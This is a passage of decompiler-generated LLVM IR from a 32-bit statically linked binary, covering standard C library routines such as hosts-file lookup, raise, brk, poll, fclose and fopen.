  store i32 ptrtoint ([7 x i8]* @global_var_8050840.93 to i32), i32* %stack_var_-216, align 4
  %v0_804c890 = load i32, i32* @edi, align 4
  %v4_804c891 = inttoptr i32 %v0_804c890 to i8*
  %v5_804c891 = call i32 @__GI_strcoll(i8* %v4_804c891, i32 ptrtoint ([7 x i8]* @global_var_8050840.93 to i32), i32 %v0_804c889, i32 %v0_804c889)
  store i32 %v5_804c891, i32* @eax, align 4
  %v1_804c899 = icmp eq i32 %v5_804c891, 0
  br i1 %v1_804c899, label %dec_label_pc_804c8db.preheader, label %dec_label_pc_804c89d

dec_label_pc_804c89d:                             ; preds = %dec_label_pc_804c889
  %v0_804c89d = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050847.94 to i32), i32* %stack_var_-216, align 4
  %v0_804c8a4 = load i32, i32* @edi, align 4
  %v4_804c8a5 = inttoptr i32 %v0_804c8a4 to i8*
  %v5_804c8a5 = call i32 @__GI_strcoll(i8* %v4_804c8a5, i32 ptrtoint ([7 x i8]* @global_var_8050847.94 to i32), i32 %v0_804c89d, i32 %v0_804c89d)
  %v1_804c8ad = icmp eq i32 %v5_804c8a5, 0
  br i1 %v1_804c8ad, label %dec_label_pc_804c8db.preheader, label %dec_label_pc_804c91e

dec_label_pc_804c8db.preheader:                   ; preds = %dec_label_pc_804c889, %dec_label_pc_804c89d
  %v0_804c8db96 = load i32, i32* @global_var_8054998.87, align 8
  %tmp4399 = icmp slt i32 %v0_804c8db96, 1
  %tmp44100 = icmp eq i1 %tmp4399, false
  br i1 %tmp44100, label %dec_label_pc_804c8b3, label %dec_label_pc_804c8e4

dec_label_pc_804c8b3:                             ; preds = %dec_label_pc_804c8db.preheader, %dec_label_pc_804c8b3.dec_label_pc_804c8b3_crit_edge
  %v0_804c8db101 = phi i32 [ %v0_804c8db, %dec_label_pc_804c8b3.dec_label_pc_804c8b3_crit_edge ], [ %v0_804c8db96, %dec_label_pc_804c8db.preheader ]
  %v1_804c8b3 = add i32 %v0_804c8db101, -1
  %v1_804c8b7 = mul i32 %v1_804c8b3, 4
  %v2_804c8b7 = add i32 %v1_804c8b7, 134564216
  %v3_804c8b7 = inttoptr i32 %v2_804c8b7 to i32*
  %v4_804c8b7 = load i32, i32* %v3_804c8b7, align 4
  store i32 %v1_804c8b3, i32* @global_var_8054998.87, align 8
  %v1_804c8c3 = call i32 @free(i32 %v4_804c8b7)
  %v0_804c8c8 = load i32, i32* @global_var_8054998.87, align 8
  %v1_804c8d0 = mul i32 %v0_804c8c8, 4
  %v2_804c8d0 = add i32 %v1_804c8d0, ptrtoint (i32* @global_var_8054978.95 to i32)
  %v3_804c8d0 = inttoptr i32 %v2_804c8d0 to i32*
  store i32 0, i32* %v3_804c8d0, align 4
  %v0_804c8db = load i32, i32* @global_var_8054998.87, align 8
  %tmp43 = icmp slt i32 %v0_804c8db, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_804c8b3.dec_label_pc_804c8b3_crit_edge, label %dec_label_pc_804c8e4

dec_label_pc_804c8b3.dec_label_pc_804c8b3_crit_edge: ; preds = %dec_label_pc_804c8b3
  br label %dec_label_pc_804c8b3

dec_label_pc_804c8e4:                             ; preds = %dec_label_pc_804c8b3, %dec_label_pc_804c8db.preheader
  %v0_804c8db.lcssa = phi i32 [ %v0_804c8db96, %dec_label_pc_804c8db.preheader ], [ %v0_804c8db, %dec_label_pc_804c8b3 ]
  store i32 1, i32* @esi, align 4
  %v5_804c911107 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804c911107, label %dec_label_pc_804c913, label %dec_label_pc_804c91e

dec_label_pc_804c8eb:                             ; preds = %dec_label_pc_804c913
  %v2_804c8ee = mul i32 %v0_804c8f5109, 4
  %v4_804c8ee = add i32 %v2_804c8ee, %v3_804c859
  %v5_804c8ee = inttoptr i32 %v4_804c8ee to i32*
  %v6_804c8ee = load i32, i32* %v5_804c8ee, align 4
  %v1_804c8f5 = add i32 %v0_804c8f5109, 1
  store i32 %v1_804c8f5, i32* @esi, align 4
  %v1_804c8f6 = inttoptr i32 %v6_804c8ee to i8*
  %v2_804c8f6 = call i32 @__GI_strdup(i8* %v1_804c8f6)
  %v1_804c8fe = load i32, i32* @ebx, align 4
  %v2_804c8fe = mul i32 %v1_804c8fe, 4
  %v3_804c8fe = add i32 %v2_804c8fe, 134564216
  %v4_804c8fe = inttoptr i32 %v3_804c8fe to i32*
  store i32 %v2_804c8f6, i32* %v4_804c8fe, align 4
  %v0_804c905 = load i32, i32* @ebx, align 4
  %v1_804c905 = add i32 %v0_804c905, 1
  store i32 %v1_804c905, i32* @global_var_8054998.87, align 8
  %v0_804c90d.pre = load i32, i32* @esi, align 4
  %v5_804c911 = icmp slt i32 %v0_804c90d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804c911, label %dec_label_pc_804c913, label %dec_label_pc_804c91e

dec_label_pc_804c913:                             ; preds = %dec_label_pc_804c8e4, %dec_label_pc_804c8eb
  %v0_804c8f5109 = phi i32 [ %v0_804c90d.pre, %dec_label_pc_804c8eb ], [ 1, %dec_label_pc_804c8e4 ]
  %v0_804c913108 = phi i32 [ %v1_804c905, %dec_label_pc_804c8eb ], [ %v0_804c8db.lcssa, %dec_label_pc_804c8e4 ]
  store i32 %v0_804c913108, i32* @ebx, align 4
  %v7_804c91c = icmp sgt i32 %v0_804c913108, 3
  br i1 %v7_804c91c, label %dec_label_pc_804c91e, label %dec_label_pc_804c8eb

dec_label_pc_804c91e:                             ; preds = %dec_label_pc_804c7ab.preheader, %dec_label_pc_804c7aa, %dec_label_pc_804c8e4, %dec_label_pc_804c913, %dec_label_pc_804c8eb, %dec_label_pc_804c89d, %dec_label_pc_804c7cc, %dec_label_pc_804c7c3, %dec_label_pc_804c91e.preheader
  %v0_804c91e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804c925, i32* @ebx, align 4
  %v3_804c92a = call i32 @fgets(i32 %v2_804c925, i32 128, i32 %v0_804c91e)
  store i32 %v3_804c92a, i32* @eax, align 4
  %v1_804c932 = icmp eq i32 %v3_804c92a, 0
  %v1_804c934 = icmp eq i1 %v1_804c932, false
  br i1 %v1_804c934, label %dec_label_pc_804c7ab.preheader, label %dec_label_pc_804c93a

dec_label_pc_804c7ab.preheader:                   ; preds = %dec_label_pc_804c91e
  %v0_804c7ab.pre = load i32, i32* @ebx, align 4
  %v4_804c7ab.pre = load i32, i32* @ecx, align 4
  %v1_804c7ab49 = inttoptr i32 %v0_804c7ab.pre to i8*
  %v2_804c7ab50 = load i8, i8* %v1_804c7ab49, align 1
  %v3_804c7ab51 = zext i8 %v2_804c7ab50 to i32
  %v5_804c7ab52 = and i32 %v4_804c7ab.pre, -256
  %v6_804c7ab53 = or i32 %v3_804c7ab51, %v5_804c7ab52
  store i32 %v6_804c7ab53, i32* @ecx, align 4
  %v4_804c7ad54 = icmp eq i8 %v2_804c7ab50, 0
  br i1 %v4_804c7ad54, label %dec_label_pc_804c91e, label %dec_label_pc_804c7b5.lr.ph

dec_label_pc_804c7b5.lr.ph:                       ; preds = %dec_label_pc_804c7ab.preheader
  %v0_804c7b5.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c7b5

dec_label_pc_804c93a:                             ; preds = %dec_label_pc_804c91e
  %v0_804c93d = load i32, i32* @ebp, align 4
  %v1_804c93e = inttoptr i32 %v0_804c93d to i16*
  %v2_804c93e = call i32 @__GI_fclose(i16* %v1_804c93e)
  br label %dec_label_pc_804c953

dec_label_pc_804c948:                             ; preds = %dec_label_pc_804c787
  %v0_804c948 = call i32 @__GI___h_errno_location()
  %v1_804c94d = inttoptr i32 %v0_804c948 to i32*
  store i32 3, i32* %v1_804c94d, align 4
  br label %dec_label_pc_804c953

dec_label_pc_804c953:                             ; preds = %entry, %dec_label_pc_804c93a, %dec_label_pc_804c948
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_804c740, i32* @eax, align 4
  %v2_804c95f = call i32 @__pthread_return_void(i32 %v2_804c740, i32 1)
  store i32 %v0_804c72c, i32* @ebp, align 4
  ret i32 %v2_804c95f

; uselistorder directives
  uselistorder i32 %v0_804c7b5.pre, { 1, 0 }
  uselistorder i32 %v6_804c7ab53, { 1, 0 }
  uselistorder i8 %v2_804c7ab50, { 1, 2, 0 }
  uselistorder i8* %v1_804c7ab49, { 1, 0 }
  uselistorder i32 %v0_804c7ab.pre, { 1, 0 }
  uselistorder i32 %v0_804c8db, { 0, 2, 1 }
  uselistorder i32 %v0_804c87e, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804c816, { 1, 0 }
  uselistorder i32 %v2_804c7f7, { 1, 0 }
  uselistorder i32 %v1_804c7eb, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804c7ba, { 1, 0 }
  uselistorder i32 %v1_804c7aa, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_8054998.87, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8054994.33, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8052160.32 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_804c953, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c91e, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_804c913, { 1, 0 }
  uselistorder label %dec_label_pc_804c8b3, { 1, 0 }
  uselistorder label %dec_label_pc_804c8db.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c889, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c87e, { 1, 0 }
  uselistorder label %dec_label_pc_804c834, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c82d, { 1, 0 }
  uselistorder label %dec_label_pc_804c824, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c811, { 1, 0 }
  uselistorder label %dec_label_pc_804c7f2, { 1, 0 }
  uselistorder label %dec_label_pc_804c91e.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_804c993 = inttoptr i32 %arg3 to i32*
  %v10_804c993 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_804c993, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_804c993
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c99f = call i32 @__libc_getpid()
  %v2_804c9ab = call i32 @kill(i32 %v0_804c99f, i32 %arg1)
  ret i32 %v2_804c9ab

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 1, 3, 2, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_804c9b4 = load i32, i32* @eax, align 4
  %v1_804c9b4 = add i32 %v0_804c9b4, 28
  %v2_804c9b4 = inttoptr i32 %v1_804c9b4 to i32*
  %v3_804c9b4 = load i32, i32* %v2_804c9b4, align 4
  store i32 %v3_804c9b4, i32* @global_var_805499c.96, align 4
  %v1_804c9bd = add i32 %v0_804c9b4, 44
  %v2_804c9bd = inttoptr i32 %v1_804c9bd to i32*
  %v3_804c9bd = load i32, i32* %v2_804c9bd, align 4
  store i32 %v3_804c9bd, i32* @global_var_80549a0.97, align 32
  ret i32 %v3_804c9bd
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c9c8 = load i32, i32* @ebx, align 4
  store i32 %v0_804c9c8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804c9db = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c9db, i32* @global_var_8052544.82, align 4
  %v7_804c9e6 = icmp ult i32 %v1_804c9db, %arg1
  %v1_804c9e8 = icmp eq i1 %v7_804c9e6, false
  br i1 %v1_804c9e8, label %dec_label_pc_804c9f8, label %dec_label_pc_804c9ea

dec_label_pc_804c9ea:                             ; preds = %entry
  %v0_804c9ea = load i32, i32* %stack_var_-4, align 4
  %v1_804c9ea = call i32 @__errno_location(i32 %v0_804c9ea)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804c9f2 = inttoptr i32 %v1_804c9ea to i32*
  store i32 12, i32* %v1_804c9f2, align 4
  %v0_804c9f9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c9f8

dec_label_pc_804c9f8:                             ; preds = %entry, %dec_label_pc_804c9ea
  %v0_804c9f9 = phi i32 [ 0, %entry ], [ %v0_804c9f9.pre, %dec_label_pc_804c9ea ]
  %v2_804c9fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c9fc, i32* @ebx, align 4
  ret i32 %v0_804c9f9

; uselistorder directives
  uselistorder i32 %v1_804c9db, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8052544.82, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c9f8, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_804ca03 = load i32, i32* @eax, align 4
  %v1_804ca05 = sub i32 0, %v0_804ca03
  %v1_804ca07 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_804ca0c = inttoptr i32 %v1_804ca07 to i32*
  store i32 %v1_804ca05, i32* %v2_804ca0c, align 4
  ret i32 -1
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804ca18 = load i32, i32* @edi, align 4
  store i32 %v0_804ca18, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804ca28 = load i32, i32* @ebx, align 4
  %v1_804ca29 = inttoptr i32 %tmp4 to %pollfd*
  %v5_804ca30 = call i32 @poll(%pollfd* %v1_804ca29, i32 %tmp3, i32 %tmp)
  store i32 %v0_804ca28, i32* @ebx, align 4
  store i32 %v5_804ca30, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804ca30, -4095
  br i1 %tmp10, label %dec_label_pc_804ca48, label %dec_label_pc_804ca3c

dec_label_pc_804ca3c:                             ; preds = %entry
  %v1_804ca3c = call i32 @__errno_location(i32 %v0_804ca28)
  %v0_804ca41 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ca41 = sub i32 0, %v0_804ca41
  %v2_804ca43 = inttoptr i32 %v1_804ca3c to i32*
  store i32 %v1_804ca41, i32* %v2_804ca43, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ca48

dec_label_pc_804ca48:                             ; preds = %entry, %dec_label_pc_804ca3c
  %v0_804ca49 = phi i32 [ %v5_804ca30, %entry ], [ -1, %dec_label_pc_804ca3c ]
  %v2_804ca4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ca4c, i32* @edi, align 4
  ret i32 %v0_804ca49

; uselistorder directives
  uselistorder i32 %v5_804ca30, { 1, 0, 2 }
  uselistorder i32 %v0_804ca28, { 1, 0 }
  uselistorder label %dec_label_pc_804ca48, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_804ca57 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ca57, i32* @esi, align 4
  %v1_804ca5b = add i32 %v4_804ca57, 52
  %v2_804ca5b = inttoptr i32 %v1_804ca5b to i32*
  %v3_804ca5b = load i32, i32* %v2_804ca5b, align 4
  store i32 %v3_804ca5b, i32* @ebp, align 4
  %v1_804ca5e = icmp eq i32 %v3_804ca5b, 0
  %v1_804ca60 = icmp eq i1 %v1_804ca5e, false
  br i1 %v1_804ca60, label %dec_label_pc_804ca81, label %dec_label_pc_804ca62

dec_label_pc_804ca62:                             ; preds = %entry
  %v1_804ca62 = add i32 %v4_804ca57, 56
  store i32 %v1_804ca62, i32* @ebx, align 4
  %v2_804ca6c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ca6c, i32* @eax, align 4
  %v2_804ca71 = call i32 @__pthread_return_void(i32 %v2_804ca6c, i32 134526883)
  %v0_804ca76 = load i32, i32* @ebx, align 4
  %v1_804ca79 = call i32 @__pthread_return_0(i32 %v0_804ca76)
  store i32 %v1_804ca79, i32* @eax, align 4
  %v0_804ca83.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ca81

dec_label_pc_804ca81:                             ; preds = %entry, %dec_label_pc_804ca62
  %v0_804ca8b = phi i32 [ %v4_804ca57, %entry ], [ %v0_804ca83.pre, %dec_label_pc_804ca62 ]
  store i32 0, i32* @edi, align 4
  %v1_804ca83 = inttoptr i32 %v0_804ca8b to i8*
  %v2_804ca83 = load i8, i8* %v1_804ca83, align 1
  %v3_804ca83 = and i8 %v2_804ca83, 64
  %v4_804ca83 = icmp eq i8 %v3_804ca83, 0
  br i1 %v4_804ca83, label %dec_label_pc_804ca81.dec_label_pc_804ca96_crit_edge, label %dec_label_pc_804ca88

dec_label_pc_804ca81.dec_label_pc_804ca96_crit_edge: ; preds = %dec_label_pc_804ca81
  br label %dec_label_pc_804ca96

dec_label_pc_804ca88:                             ; preds = %dec_label_pc_804ca81
  %v1_804ca8c = inttoptr i32 %v0_804ca8b to i16*
  %v2_804ca8c = call i32 @fflush_unlocked(i16* %v1_804ca8c)
  store i32 %v2_804ca8c, i32* @edi, align 4
  %v0_804ca99.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ca96

dec_label_pc_804ca96:                             ; preds = %dec_label_pc_804ca81.dec_label_pc_804ca96_crit_edge, %dec_label_pc_804ca88
  %v0_804ca99 = phi i32 [ %v0_804ca8b, %dec_label_pc_804ca81.dec_label_pc_804ca96_crit_edge ], [ %v0_804ca99.pre, %dec_label_pc_804ca88 ]
  %v1_804ca99 = add i32 %v0_804ca99, 4
  %v2_804ca99 = inttoptr i32 %v1_804ca99 to i32*
  %v3_804ca99 = load i32, i32* %v2_804ca99, align 4
  %v1_804ca9c = call i32 @__libc_close(i32 %v3_804ca99)
  %v0_804caa4 = load i32, i32* @esi, align 4
  %v1_804caa4 = add i32 %v0_804caa4, 4
  %v2_804caa4 = inttoptr i32 %v1_804caa4 to i32*
  store i32 -1, i32* %v2_804caa4, align 4
  %v2_804cab5 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804cab5, i32* @ebx, align 4
  %v2_804caba = icmp slt i32 %v1_804ca9c, 0
  store i32 -1, i32* @eax, align 4
  %v1_804cac1 = load i32, i32* @edi, align 4
  %v3_804cac1 = select i1 %v2_804caba, i32 -1, i32 %v1_804cac1
  store i32 %v3_804cac1, i32* @edi, align 4
  %v2_804cac4 = call i32 @__pthread_return_void(i32 %v2_804cab5, i32 134526883)
  %v1_804cad0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804cad5 = load i32, i32* @global_var_8052548.99, align 8
  %v1_804cada = add i32 %v0_804cad5, 1
  store i32 %v1_804cada, i32* @global_var_8052548.99, align 8
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v2_804cae5 = call i32 @__pthread_return_void(i32 %v2_804cab5, i32 1)
  %v0_804caea = load i32, i32* @esi, align 4
  %v1_804caea = inttoptr i32 %v0_804caea to i32*
  %v2_804caea = load i32, i32* %v1_804caea, align 4
  %v1_804caef = and i32 %v2_804caea, 24576
  %v1_804caf4 = or i32 %v1_804caef, 48
  store i32 %v1_804caf4, i32* @eax, align 4
  %v1_804caf9 = trunc i32 %v1_804caf4 to i16
  %v3_804caf9 = inttoptr i32 %v0_804caea to i16*
  store i16 %v1_804caf9, i16* %v3_804caf9, align 2
  br i1 %v1_804ca60, label %dec_label_pc_804cb0f, label %dec_label_pc_804cafe

dec_label_pc_804cafe:                             ; preds = %dec_label_pc_804ca96
  %v2_804cb02 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cb02, i32* @eax, align 4
  %v2_804cb07 = call i32 @__pthread_return_void(i32 %v2_804cb02, i32 1)
  store i32 %v2_804cb07, i32* @eax, align 4
  br label %dec_label_pc_804cb0f

dec_label_pc_804cb0f:                             ; preds = %dec_label_pc_804ca96, %dec_label_pc_804cafe
  %v0_804cb0f = load i32, i32* @esi, align 4
  %v1_804cb0f = add i32 %v0_804cb0f, 1
  %v2_804cb0f = inttoptr i32 %v1_804cb0f to i8*
  %v3_804cb0f = load i8, i8* %v2_804cb0f, align 1
  %v4_804cb0f = and i8 %v3_804cb0f, 64
  %v5_804cb0f = icmp eq i8 %v4_804cb0f, 0
  br i1 %v5_804cb0f, label %dec_label_pc_804cb23, label %dec_label_pc_804cb15

dec_label_pc_804cb15:                             ; preds = %dec_label_pc_804cb0f
  %v1_804cb18 = add i32 %v0_804cb0f, 8
  %v2_804cb18 = inttoptr i32 %v1_804cb18 to i32*
  %v3_804cb18 = load i32, i32* %v2_804cb18, align 4
  %v1_804cb1b = call i32 @free(i32 %v3_804cb18)
  store i32 %v1_804cb1b, i32* @eax, align 4
  br label %dec_label_pc_804cb23

dec_label_pc_804cb23:                             ; preds = %dec_label_pc_804cb0f, %dec_label_pc_804cb15
  %v2_804cb2f = call i32 @__pthread_return_void(i32 %v2_804cab5, i32 134526883)
  %v1_804cb3b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v0_804cb41 = load i32, i32* @global_var_805254c.100, align 4
  %v1_804cb41 = add i32 %v0_804cb41, 1
  store i32 %v1_804cb41, i32* @global_var_805254c.100, align 4
  %v2_804cb4b = call i32 @__pthread_return_void(i32 %v2_804cab5, i32 1)
  %v0_804cb50 = call i32 @_stdio_openlist_dec_use()
  %v0_804cb58 = load i32, i32* @edi, align 4
  ret i32 %v0_804cb58

; uselistorder directives
  uselistorder i32 %v2_804cab5, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @__libc_close, { 4, 3, 2, 1, 5, 0 }
  uselistorder label %dec_label_pc_804cb23, { 1, 0 }
  uselistorder label %dec_label_pc_804cb0f, { 1, 0 }
  uselistorder label %dec_label_pc_804ca96, { 1, 0 }
  uselistorder label %dec_label_pc_804ca81, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804cb6f = inttoptr i32 %arg2 to i8*
  %v5_804cb6f = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804cb6f, i32 0, i32 -1)
  ret i32 %v5_804cb6f
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cb78 = load i32, i32* @ebp, align 4
  %v0_804cb79 = load i32, i32* @edi, align 4
  %v0_804cb7a = load i32, i32* @esi, align 4
  %v0_804cb7b = load i32, i32* @ebx, align 4
  store i32 %v0_804cb7b, i32* %stack_var_-16, align 4
  %v4_804cb7f = ptrtoint i8* %arg2 to i32
  store i32 %v4_804cb7f, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804cb8f = load i8, i8* %arg2, align 1
  %v3_804cb8f = zext i8 %v2_804cb8f to i32
  %v4_804cb8f = load i32, i32* @eax, align 4
  %v5_804cb8f = and i32 %v4_804cb8f, -256
  %v6_804cb8f = or i32 %v5_804cb8f, %v3_804cb8f
  store i32 %v6_804cb8f, i32* %eax.global-to-local, align 4
  %v10_804cb91 = icmp eq i8 %v2_804cb8f, 114
  br i1 %v10_804cb91, label %dec_label_pc_804cbd3, label %dec_label_pc_804cb95

dec_label_pc_804cb95:                             ; preds = %entry
  %v10_804cb95 = icmp eq i8 %v2_804cb8f, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804cb95, label %dec_label_pc_804cbd5, label %dec_label_pc_804cb9e

dec_label_pc_804cb9e:                             ; preds = %dec_label_pc_804cb95
  %v10_804cb9e = icmp eq i8 %v2_804cb8f, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804cb9e, label %dec_label_pc_804cbd5, label %dec_label_pc_804cba6

dec_label_pc_804cba6:                             ; preds = %dec_label_pc_804cc4e, %dec_label_pc_804cc28, %dec_label_pc_804cb9e
  %v0_804cba6 = load i32, i32* %stack_var_-16, align 4
  %v1_804cba6 = call i32 @__errno_location(i32 %v0_804cba6)
  store i32 %v1_804cba6, i32* %eax.global-to-local, align 4
  %v0_804cbab = load i32, i32* @ebp, align 4
  %v1_804cbab = icmp eq i32 %v0_804cbab, 0
  %v1_804cbad = inttoptr i32 %v1_804cba6 to i32*
  store i32 22, i32* %v1_804cbad, align 4
  br i1 %v1_804cbab, label %dec_label_pc_804cdaf, label %dec_label_pc_804cbb9

dec_label_pc_804cbb9:                             ; preds = %dec_label_pc_804cc71, %dec_label_pc_804cba6
  %v0_804cbb9 = load i32, i32* @ebp, align 4
  %v1_804cbb9 = add i32 %v0_804cbb9, 1
  %v2_804cbb9 = inttoptr i32 %v1_804cbb9 to i8*
  %v3_804cbb9 = load i8, i8* %v2_804cbb9, align 1
  %v4_804cbb9 = and i8 %v3_804cbb9, 32
  %v5_804cbb9 = icmp eq i8 %v4_804cbb9, 0
  br i1 %v5_804cbb9, label %dec_label_pc_804cdaf, label %dec_label_pc_804cbc3

dec_label_pc_804cbc3:                             ; preds = %dec_label_pc_804cbb9
  store i32 %v0_804cbb9, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804cbc9 = call i32 @free(i32 %v0_804cbb9)
  br label %dec_label_pc_804cdaa

dec_label_pc_804cbd3:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804cbd5

dec_label_pc_804cbd5:                             ; preds = %dec_label_pc_804cb9e, %dec_label_pc_804cb95, %dec_label_pc_804cbd3
  %v0_804cbe6 = phi i32 [ 1089, %dec_label_pc_804cb9e ], [ 577, %dec_label_pc_804cb95 ], [ 0, %dec_label_pc_804cbd3 ]
  %v1_804cbd5 = add i32 %v4_804cb7f, 1
  %v2_804cbd5 = inttoptr i32 %v1_804cbd5 to i8*
  %v3_804cbd5 = load i8, i8* %v2_804cbd5, align 1
  %v12_804cbd5 = icmp eq i8 %v3_804cbd5, 98
  %v1_804cbd5.v4_804cb7f = select i1 %v12_804cbd5, i32 %v1_804cbd5, i32 %v4_804cb7f
  store i32 %v1_804cbd5.v4_804cb7f, i32* %eax.global-to-local, align 4
  %v1_804cbe0 = add i32 %v1_804cbd5.v4_804cb7f, 1
  %v2_804cbe0 = inttoptr i32 %v1_804cbe0 to i8*
  %v3_804cbe0 = load i8, i8* %v2_804cbe0, align 1
  %v12_804cbe0 = icmp eq i8 %v3_804cbe0, 43
  %v1_804cbe4 = icmp eq i1 %v12_804cbe0, false
  br i1 %v1_804cbe4, label %dec_label_pc_804cbee, label %dec_label_pc_804cbe6

dec_label_pc_804cbe6:                             ; preds = %dec_label_pc_804cbd5
  %v1_804cbe8 = or i32 %v0_804cbe6, 1
  store i32 %v1_804cbe8, i32* %eax.global-to-local, align 4
  %v1_804cbeb = add nuw nsw i32 %v1_804cbe8, 1
  store i32 %v1_804cbeb, i32* @ebx, align 4
  br label %dec_label_pc_804cbee

dec_label_pc_804cbee:                             ; preds = %dec_label_pc_804cbd5, %dec_label_pc_804cbe6
  %v0_804cc717 = phi i32 [ %v0_804cbe6, %dec_label_pc_804cbd5 ], [ %v1_804cbeb, %dec_label_pc_804cbe6 ]
  %v1_804cbee = icmp eq i32 %arg3, 0
  %v1_804cbf0 = icmp eq i1 %v1_804cbee, false
  br i1 %v1_804cbf0, label %dec_label_pc_804cc24, label %dec_label_pc_804cbf2

dec_label_pc_804cbf2:                             ; preds = %dec_label_pc_804cbee
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804cbf7 = call i32 @malloc(i32 80)
  store i32 %v1_804cbf7, i32* %eax.global-to-local, align 4
  %v2_804cbff = icmp eq i32 %v1_804cbf7, 0
  store i32 %v1_804cbf7, i32* @ebp, align 4
  br i1 %v2_804cbff, label %dec_label_pc_804cdb1, label %dec_label_pc_804cc09

dec_label_pc_804cc09:                             ; preds = %dec_label_pc_804cbf2
  %v2_804cbf7 = inttoptr i32 %v1_804cbf7 to i16*
  store i16 8192, i16* %v2_804cbf7, align 2
